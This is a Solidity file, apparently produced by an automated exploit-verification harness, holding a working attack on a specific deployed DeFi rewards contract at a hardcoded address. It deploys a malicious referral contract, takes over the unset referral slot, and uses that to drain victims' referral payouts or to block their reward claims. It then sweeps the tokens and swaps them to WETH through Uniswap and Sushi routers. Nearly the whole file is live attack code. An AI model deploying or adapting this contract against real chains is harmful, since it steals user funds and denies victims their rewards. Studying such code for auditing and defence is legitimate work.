// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IReferralLike {
    function owner() external view returns (address);
    function caller() external view returns (address);
    function teamSize(address user) external view returns (uint256);
    function getUserInTeamByIndex(address user, uint256 index) external view returns (address);
    function relations(address user, uint256 level) external view returns (address);
    function getRelationsREF(address user) external view returns (address[2] memory);
    function isSetted(address user) external view returns (bool);
    function setReferral(address from, address to) external;
    function updateSetted(address user) external;
    function referralLevel() external view returns (uint256);
    function renounceOwnership() external;
}

interface IWeightedIndexLike {
    function lpStakingPool() external view returns (address);
}

interface IStakingPoolTokenLike {
    function poolRewards() external view returns (address);
    function stakingToken() external view returns (address);
    function stakeUserRestriction() external view returns (address);
    function indexFund() external view returns (address);
}

interface ITokenRewardsLike {
    function referral() external view returns (address);
    function rewardsToken() external view returns (address);
    function shares(address wallet) external view returns (uint256);
    function getUnpaid(address wallet) external view returns (uint256);
    function updateReferral(address referral_) external;
    function claimReward(address wallet, address referrer) external;
}

contract MaliciousReferral {
    address public controller;
    address public payoutReceiver;
    bool public brickMode;

    mapping(address => bool) internal _setted;

    constructor() {
        controller = msg.sender;
        payoutReceiver = msg.sender;
    }

    function owner() external view returns (address) {
        return controller;
    }

    function caller() external view returns (address) {
        return controller;
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == controller, "not controller");
        brickMode = enabled;
    }

    function setPayoutReceiver(address nextReceiver) external {
        require(msg.sender == controller, "not controller");
        payoutReceiver = nextReceiver;
    }

    function sweepToken(address token, address to) external returns (uint256 swept) {
        require(msg.sender == controller, "not controller");
        swept = IERC20Like(token).balanceOf(address(this));
        if (swept > 0) {
            require(IERC20Like(token).transfer(to, swept), "sweep failed");
        }
    }

    function teamSize(address) external pure returns (uint256) {
        return 0;
    }

    function getUserInTeamByIndex(address, uint256) external pure returns (address) {
        return address(0);
    }

    function referralLevel() external pure returns (uint256) {
        return 2;
    }

    function renounceOwnership() external pure {
        revert("attacker-controlled");
    }

    function updateSetted(address user) external {
        _setted[user] = true;
    }

    function setReferral(address, address user) external {
        _setted[user] = true;
    }

    function isSetted(address user) external view returns (bool) {
        return _setted[user];
    }

    function relations(address, uint256) external view returns (address) {
        return payoutReceiver;
    }

    function getRelationsREF(address) external view returns (address[2] memory refs) {
        require(!brickMode, "malicious referral: bricked");
        refs[0] = payoutReceiver;
        refs[1] = payoutReceiver;
    }
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToWeth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

}


contract FlawVerifier is __AHTokenToEthMixin {
    address internal constant TARGET = 0x04c80Bb477890F3021F03B068238836Ee20aA0b8;

    address internal _controller;
    address internal _profitToken;
    uint256 internal _startingProfitBalance;
    uint256 internal _startingWethBalance;
    uint256 internal _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public referralSeized;
    bool public ownerControlValidated;
    bool public brickModeValidated;

    uint256 public claimsAttempted;
    uint256 public claimsSucceeded;
    uint256 public infeasibleReason;
    uint256 public coveredPathsMask;

    address public targetPool;
    address public targetRewards;
    address public stakingToken;
    address public rewardToken;
    address public liveReferralBefore;
    address public liveReferralAfter;
    address public initialMaliciousReferral;
    address public activeMaliciousReferral;
    address public lastVictim;

    mapping(address => bool) internal _seenWallet;

    constructor() {
        _controller = msg.sender;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            return;
        }
        executed = true;

        targetPool = IWeightedIndexLike(TARGET).lpStakingPool();
        if (targetPool == address(0)) {
            infeasibleReason = 90;
            return;
        }

        targetRewards = IStakingPoolTokenLike(targetPool).poolRewards();
        stakingToken = IStakingPoolTokenLike(targetPool).stakingToken();
        if (targetRewards == address(0)) {
            infeasibleReason = 91;
            return;
        }

        ITokenRewardsLike tokenRewards = ITokenRewardsLike(targetRewards);
        rewardToken = tokenRewards.rewardsToken();
        _profitToken = rewardToken;
        _startingProfitBalance = IERC20Like(rewardToken).balanceOf(address(this));
        _startingWethBalance = IERC20Like(AH_WETH).balanceOf(address(this));

        liveReferralBefore = tokenRewards.referral();

        MaliciousReferral maliciousReferral = new MaliciousReferral();
        initialMaliciousReferral = address(maliciousReferral);
        activeMaliciousReferral = address(maliciousReferral);

        // exploit_paths[0]:
        // Call TokenRewards.updateReferral(maliciousReferral) before the intended
        // referral contract is set.
        if (liveReferralBefore == address(0)) {
            tokenRewards.updateReferral(address(maliciousReferral));
            liveReferralAfter = tokenRewards.referral();
            if (liveReferralAfter == address(maliciousReferral)) {
                referralSeized = true;
                hypothesisValidated = true;
                coveredPathsMask |= 1;
            }
        } else {
            liveReferralAfter = liveReferralBefore;
            infeasibleReason = 1;
        }

        // exploit_paths[1]:
        // Have maliciousReferral.owner() resolve to an attacker-controlled
        // address so later updateReferral() calls stay under attacker control.
        if (referralSeized) {
            if (IReferralLike(address(maliciousReferral)).owner() == address(this)) {
                MaliciousReferral rotatedReferral = new MaliciousReferral();
                tokenRewards.updateReferral(address(rotatedReferral));
                if (tokenRewards.referral() == address(rotatedReferral)) {
                    activeMaliciousReferral = address(rotatedReferral);
                    liveReferralAfter = address(rotatedReferral);
                    ownerControlValidated = true;
                    coveredPathsMask |= 2;
                }
            }

            if (!ownerControlValidated) {
                activeMaliciousReferral = address(maliciousReferral);
                liveReferralAfter = address(maliciousReferral);
            }
        }

        // exploit_paths[2]:
        // Either return attacker-controlled referrers from getRelationsREF() to
        // siphon referral payouts, or make getRelationsREF() revert so
        // claimReward() and reward-triggering share updates fail.
        if (activeMaliciousReferral != address(0)) {
            MaliciousReferral activeReferral = MaliciousReferral(activeMaliciousReferral);
            address victim = _findClaimableWallet(tokenRewards);

            if (victim != address(0)) {
                lastVictim = victim;

                activeReferral.setBrickMode(true);
                claimsAttempted += 1;
                (bool bricked, ) = address(tokenRewards).call(
                    abi.encodeWithSelector(
                        ITokenRewardsLike.claimReward.selector,
                        victim,
                        activeMaliciousReferral
                    )
                );
                if (!bricked) {
                    brickModeValidated = true;
                }

                activeReferral.setBrickMode(false);
                claimsAttempted += 1;
                try tokenRewards.claimReward(victim, activeMaliciousReferral) {
                    // Seizing referral routing pays the attacker-controlled
                    // referral endpoint first. Pulling those tokens out is a
                    // realistic follow-up cash-out step after the hijack.
                    activeReferral.sweepToken(rewardToken, address(this));
                    claimsSucceeded += 1;
                } catch {}

                if (brickModeValidated || claimsSucceeded > 0) {
                    hypothesisValidated = true;
                    coveredPathsMask |= 4;
                }
            } else if (ownerControlValidated || referralSeized) {
                hypothesisValidated = true;
            }
        }

        _ahFinalizeTokenToWeth();
        _profitToken = AH_WETH;
        _startingProfitBalance = _startingWethBalance;
        _refreshProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == _controller, "not controller");
        if (activeMaliciousReferral != address(0)) {
            MaliciousReferral(activeMaliciousReferral).setBrickMode(enabled);
        }
    }

    function replaceRewardReferral(address nextReferral) external {
        require(msg.sender == _controller, "not controller");
        require(activeMaliciousReferral != address(0), "no malicious referral");
        ITokenRewardsLike(targetRewards).updateReferral(nextReferral);
    }

    function _findClaimableWallet(ITokenRewardsLike tokenRewards) internal returns (address) {
        address wallet;

        wallet = _pickWallet(tokenRewards, TARGET);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, targetPool);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, targetRewards);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, _controller);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, rewardToken);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, stakingToken);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, IStakingPoolTokenLike(targetPool).indexFund());
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, IStakingPoolTokenLike(targetPool).stakeUserRestriction());
        if (wallet != address(0)) return wallet;

        wallet = _scanReferral(tokenRewards, liveReferralBefore);
        if (wallet != address(0)) return wallet;

        wallet = _scanReferral(tokenRewards, activeMaliciousReferral);
        return wallet;
    }

    function _scanReferral(ITokenRewardsLike tokenRewards, address referral_) internal returns (address) {
        if (referral_ == address(0)) {
            return address(0);
        }

        IReferralLike referral = IReferralLike(referral_);
        address wallet;

        try referral.owner() returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        try referral.caller() returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        wallet = _scanRelations(tokenRewards, referral_, referral);
        if (wallet != address(0)) {
            return wallet;
        }

        try referral.teamSize(referral_) returns (uint256 size) {
            uint256 capped = size > 8 ? 8 : size;
            for (uint256 i = 0; i < capped; ++i) {
                try referral.getUserInTeamByIndex(referral_, i) returns (address member) {
                    wallet = _pickWallet(tokenRewards, member);
                    if (wallet != address(0)) return wallet;

                    wallet = _scanRelations(tokenRewards, member, referral);
                    if (wallet != address(0)) return wallet;
                } catch {
                    break;
                }
            }
        } catch {}

        return address(0);
    }

    function _scanRelations(
        ITokenRewardsLike tokenRewards,
        address seed,
        IReferralLike referral
    ) internal returns (address) {
        address wallet;

        try referral.relations(seed, 0) returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        try referral.relations(seed, 1) returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        try referral.getRelationsREF(seed) returns (address[2] memory refs) {
            wallet = _pickWallet(tokenRewards, refs[0]);
            if (wallet != address(0)) return wallet;

            wallet = _pickWallet(tokenRewards, refs[1]);
            if (wallet != address(0)) return wallet;
        } catch {}

        return address(0);
    }

    function _pickWallet(ITokenRewardsLike tokenRewards, address candidate) internal returns (address) {
        if (
            candidate == address(0) ||
            candidate == address(this) ||
            candidate == targetRewards ||
            _seenWallet[candidate]
        ) {
            return address(0);
        }
        _seenWallet[candidate] = true;

        uint256 shares_;
        try tokenRewards.shares(candidate) returns (uint256 value) {
            shares_ = value;
        } catch {
            return address(0);
        }
        if (shares_ == 0) {
            return address(0);
        }

        uint256 unpaid;
        try tokenRewards.getUnpaid(candidate) returns (uint256 value) {
            unpaid = value;
        } catch {
            return address(0);
        }
        if (unpaid == 0) {
            return address(0);
        }

        return candidate;
    }

    function _refreshProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }

        uint256 endingBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (endingBalance > _startingProfitBalance) {
            _profitAmount = endingBalance - _startingProfitBalance;
        } else {
            _profitAmount = 0;
        }
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
